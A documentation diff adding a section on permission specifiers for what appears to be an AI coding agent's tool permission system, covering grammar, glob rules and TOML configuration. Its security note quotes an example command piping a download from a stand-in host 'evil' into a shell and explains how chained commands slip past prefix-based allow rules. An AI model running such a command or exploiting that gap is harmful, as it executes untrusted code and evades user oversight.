@@ -60,6 +60,86 @@ allow = [
 - **文件写入工具**（write_file, edit_file）→ 检查路径是否在 cwd 内且非敏感路径
 - **bash** → 按 bash allowlist 模式匹配；未匹配则 Ask
 
+### Permission Specifiers
+
+Permission specifiers are a concise alternative to `args` regex rules. They
+use `Tool(specifier)` syntax and match against decoded argument fields instead
+of raw JSON.
+
+#### Grammar
+
+```
+Bash(<prefix>:*)       — command starts with <prefix> (case-sensitive)
+Bash(<prefix>)         — same as above (trailing :* is optional)
+Bash(*)                — any bash command (prefix is empty)
+Read(<glob>)           — path matches <glob>
+Edit(<glob>)           — path matches <glob>
+Write(<glob>)          — path matches <glob>
+<name>(<specifier>)    — any other tool name with glob specifier
+```
+
+#### Tool-family expansion
+
+Friendly names expand to internal tool names:
+
+| Specifier | Expands to |
+|-----------|------------|
+| `Bash`    | `bash`, `bash_pty` |
+| `Read`    | `read_file` |
+| `Edit`    | `edit_file` |
+| `Write`   | `write_file` |
+| `WebFetch`| `web_fetch` |
+| `WebSearch`| `web_search` |
+
+#### Glob rules
+
+- `*`  — matches any characters except `/` (single path segment)
+- `**` — matches any characters including `/` (full subtree)
+
+Examples: `src/**` matches `src/main.go` and `src/pkg/util.go`; `*.go` matches
+`main.go` but not `dir/main.go`.
+
+#### Configuration
+
+Specifiers are configured as string lists under `[permissions]`:
+
+```toml
+[permissions]
+allow_specifiers = [
+  "Bash(go test:*)",
+  "Bash(go build:*)",
+  "Read(src/**)",
+]
+deny_specifiers = [
+  "Edit(.git/**)",
+]
+ask_specifiers = [
+  "Write(internal/**)",
+]
+```
+
+Specifiers are parsed into the same rule engine as `[permissions.rules]` and
+are appended after struct-form rules within each bucket (Deny/Ask/Allow).
+Standard Deny->Ask->Apply priority is unchanged. Like all rules, specifiers
+only run in ModeDefault; they cannot override yolo/read-only/ask-all/plan modes.
+
+#### `:*` convention
+
+For `Bash` specifiers, the `:*` suffix signals "prefix match on the command
+string". Without it, `Bash(go test)` still works identically. The suffix
+exists for readability and to distinguish from bare tool-name rules.
+
+#### Security note: Bash prefix matching
+
+Bash specifiers use a simple `strings.HasPrefix` on the raw command string.
+They do **not** parse shell operators. This means `Bash(go test:*)` also
+matches commands like `go test && curl evil | sh`. This matches Claude Code
+semantics and is safe because specifiers are opt-in allow rules — a user
+who writes `Bash(go test:*)` is explicitly trusting commands that start with
+`go test`. If you need finer control, combine a specifier allow with a
+struct-form deny rule (e.g. deny `args = "&&|\\|"` on bash), or use the
+bash allowlist (`[permissions].allow_bash`) which does token-level matching.
+
 ## 完整配置示例
 
 ```toml
